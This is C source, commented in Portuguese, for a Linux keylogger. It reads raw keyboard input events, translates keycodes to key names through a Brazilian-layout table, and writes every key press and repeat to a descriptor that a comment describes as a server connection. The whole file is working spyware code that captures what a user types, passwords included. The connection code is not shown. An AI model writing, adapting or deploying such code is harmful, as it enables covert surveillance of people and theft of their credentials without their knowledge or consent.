#include <linux/input.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>
#include "keylogger.h"

#define BUFFER_SIZE 100
#define NUM_KEYCODES 128

// Matriz que mapeia o teclado
const char *keycodes[] = {
    "RESERVED ",
    "ESC ",
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "0",
    "-",
    "=",
    "BACKSPACE",
    "TAB ",
    "q",
    "w",
    "e",
    "r",
    "t",
    "y",
    "u",
    "i",
    "o",
    "p",
    "´",
    "[",
    "ENTER",
    "LEFTCTRL ",
    "a",
    "s",
    "d",
    "f",
    "g",
    "h",
    "j",
    "k",
    "l",
    "ç",
    "~",
    "APOSTROPHE ",
    "LEFTSHIFT ",
    "]",
    "z",
    "x",
    "c",
    "v",
    "b",
    "n",
    "m",
    ",",
    ".",
    ";",
    "RIGHTSHIFT ",
    "KPASTERISK ",
    "LEFTALT ",
    "SPACE",
    "CAPSLOCK",
    "F1 ",
    "F2 ",
    "F3 ",
    "F4 ",
    "F5 ",
    "F6 ",
    "F7 ",
    "F8 ",
    "F9 ",
    "F10 ",
    "NUMLOCK ",
    "SCROLLLOCK ",
    "KP7 ",
    "KP8 ",
    "KP9 ",
    "KPMINUS ",
    "KP4 ",
    "KP5 ",
    "KP6 ",
    "KPPLUS ",
    "KP1 ",
    "KP2 ",
    "KP3 ",
    "KP0 ",
    "KPCOMMA ",
    " ",
    " ",
    "BACKSLASH ",
    "F11 ",
    "F12 ",
    "/",
    " ",
    " ",
    " ",
    " ",
    "KPJPCOMMA ",
    "KPENTER ",
    "RIGHENTER",
    "RIGHTALT ",
    "/",
    "SYSRQ ",
    "ALTGR ",
    "UP ",
    "HOME ",
    "UP ",
    "PAGEUP ",
    "LEFT ",
    "RIGHT ",
    "END ",
    "DOWN ",
    "PAGEDOWN ",
    "MACRO ",
    "DELETE ",
    "VOLUMEDOWN ",
    "VOLUMEUP ",
    "POWER ",
    "KPEQUAL ",
    "TURNOFF ",
    "KPCOMMA ",
    " ",
    " ",
    " ",
    " ",
    " ",
    " ",
    " ",
    "WIN ",
    " ",
    "MENU "};

int loop = 1;

void sigint_handler(int sig)
{
  loop = 0;
}

// Escreve em file_desc a string str
int write_all(int file_desc, const char *str)
{
  int bytesWritten = 0;
  int bytesToWrite = strlen(str) + 1;

  do
  {
    bytesWritten = write(file_desc, str, bytesToWrite); // enviando para o servidor

    if (bytesWritten == -1)
    {
      return 0;
    }
    bytesToWrite -= bytesWritten;
    str += bytesWritten;
  } while (bytesToWrite > 0);

  return 1;
}

// chama a write_all para dar exit de maneira segura
void safe_write_all(int file_desc, const char *str, int keyboard)
{
  struct sigaction new_actn, old_actns;
  new_actn.sa_handler = SIG_IGN;
  sigemptyset(&new_actn.sa_mask);
  new_actn.sa_flags = 0;

  sigaction(SIGPIPE, &new_actn, &old_actns);

  if (!write_all(file_desc, str)) // se nao conseguiu escrever
  {
    close(file_desc);
    close(keyboard);
    perror("\nwriting");
    exit(1);
  }

  sigaction(SIGPIPE, &old_actns, NULL);
}

void keylogger(int keyboard, int writeout)
{
  int eventSize = sizeof(struct input_event);
  int bytesRead = 0;
  struct input_event events[NUM_EVENTS];
  int i;

  signal(SIGINT, sigint_handler); // instalando um tratador para o sinal SIGINT

  while (loop)
  {
    bytesRead = read(keyboard, events, eventSize * NUM_EVENTS); // lendo do teclado

    for (i = 0; i < (bytesRead / eventSize); ++i)
    {
      if (events[i].type == EV_KEY)
      {
        if (events[i].value == 1)
        {
          if (events[i].code > 0 && events[i].code < NUM_KEYCODES)
          {
            safe_write_all(writeout, keycodes[events[i].code], keyboard);
            safe_write_all(writeout, "\n", keyboard);
          }
          else
          {
            safe_write_all(writeout, "UNRECOGNIZED", keyboard);
            safe_write_all(writeout, "\n", keyboard);
          }
        }
        else if (events[i].value == 2)
        {
          if (events[i].code > 0 && events[i].code < NUM_KEYCODES)
          {
            safe_write_all(writeout, keycodes[events[i].code], keyboard);
            safe_write_all(writeout, "\n", keyboard);
          }
          else
          {
            safe_write_all(writeout, "UNRECOGNIZED", keyboard);
            safe_write_all(writeout, "\n", keyboard);
          }
        }
      }
    }
  }
  if (bytesRead > 0)
    safe_write_all(writeout, "\n", keyboard);
}
